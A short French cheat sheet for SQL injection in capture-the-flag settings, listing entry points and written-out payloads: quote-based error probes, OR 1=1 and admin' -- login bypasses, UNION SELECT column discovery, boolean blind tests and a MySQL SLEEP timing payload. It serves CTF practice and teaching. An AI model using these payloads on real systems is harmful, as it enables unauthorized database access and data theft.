# Guide SQLi (CTF)

### 1. Points d'entrée

* Formulaires de connexion (Login).
* Barres de recherche.
* Paramètres d'URL (`?id=123`).

### 2. Contextes et Payloads

> **Astuce :** Testez d'abord `'` pour provoquer une erreur.

* **Numérique :** `?id=1 OR 1=1`
* **Texte :** `?user=admin' --` ou `?user=' OR '1'='1' --`

### 3. Extraction via UNION

Utilisé si l'application affiche les données à l'écran.

1. **Trouver les colonnes :** `?id=1 ORDER BY X--` (incrémenter X).
2. **Tester l'affichage :** `?id=-1 UNION SELECT NULL,NULL,NULL--`

### 4. Injection Aveugle (Blind)

Utilisé si rien ne s'affiche.

* **Booléen :** Comparer `?id=1 AND 1=1` (vrai) et `?id=1 AND 1=2` (faux).
* **Temps (MySQL) :** `?id=1 AND IF(1=1, SLEEP(2), 0)--` (vérifier le délai de réponse).
